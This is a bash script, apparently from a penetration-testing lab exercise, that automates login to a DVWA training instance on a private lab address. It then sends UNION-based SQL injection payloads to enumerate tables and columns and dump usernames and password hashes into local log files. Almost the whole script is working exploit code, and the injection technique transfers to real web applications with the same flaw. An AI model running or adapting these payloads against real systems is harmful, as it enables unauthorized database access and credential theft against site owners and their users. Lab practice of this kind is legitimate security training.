#!/bin/bash

SECURITY="medium" #security level
USER="admin" #username
PASS="password" #password

rm cookies.txt #removes old file with cookies

#saves login cookies and login page html to local files
curl -s -c cookies.txt \
-b "security=$SECURITY" \
http://192.168.56.105/DVWA/login.php \
>login.html

TOKEN=$(grep -oP "name='user_token' value='\K[^']+" login.html) #saves user token variable found in login html
PHPSESSID=$(awk '$6=="PHPSESSID"{print $7}' cookies.txt) #saves PHP session ID found in cookies

#logs in using cookies and user token
curl -s -b cookies.txt \
-b "security=$SECURITY" \
-d "username=$USER&password=$PASS&user_token=$TOKEN&Login=Login" \
http://192.168.56.105/DVWA/login.php



#saves result of table name retrieval to local log file
{
echo "Security level: $SECURITY"
echo "Attempting to retrieve table names..."
echo "---------------------------------------------------"
RESPONSE=$(curl -s -X POST \
  -b "PHPSESSID=$PHPSESSID; security=$SECURITY" \
  -d "id=1 UNION SELECT table_name, NULL  FROM information_schema.tables  WHERE table_schema = database()#&Submit=Submit" \
  http://192.168.56.105/DVWA/vulnerabilities/sqli/)
echo "$RESPONSE" | grep -oP 'First name: \K[^<]+' | tail -n +2 #Removes header (First name:) from result and removes the first line (admin admin)
}> /home/kali/sqli_medium1.log



#saves result of column name retrieval to local log file
{
echo "Security level: $SECURITY"
echo "Attempting to retrieve column names..."
echo "---------------------------------------------------"
RESPONSE=$(curl -s -X POST \
  -b "PHPSESSID=$PHPSESSID; security=$SECURITY" \
  -d "id=1 UNION SELECT column_name, NULL  FROM information_schema.columns  WHERE table_name = 0x7573657273#&Submit=Submit" \
  http://192.168.56.105/DVWA/vulnerabilities/sqli/)
echo "$RESPONSE" | grep -oP 'First name: \K[^<]+' | tail -n +2 #Removes header (First name:) from result and removes the first line (admin admin)
}> /home/kali/sqli_medium2.log



#saves result of credential retrieval to local log file
{
echo "Security level: $SECURITY"
echo "Attempting to retrieve credentials..."
echo "---------------------------------------------------"
RESPONSE=$(curl -s -X POST \
  -b "PHPSESSID=$PHPSESSID; security=$SECURITY" \
  -d "id=1 UNION SELECT user, password FROM users#&Submit=Submit" \
  http://192.168.56.105/DVWA/vulnerabilities/sqli/)
echo "$RESPONSE" | grep -oP 'First name: \K[^<]+|Surname: \K[^<]+' | paste - - | tail -n +2 #Removes header (First name:) from result and removes the first line (admin admin). Returns username and password on the same line
}> /home/kali/sqli_medium3.log
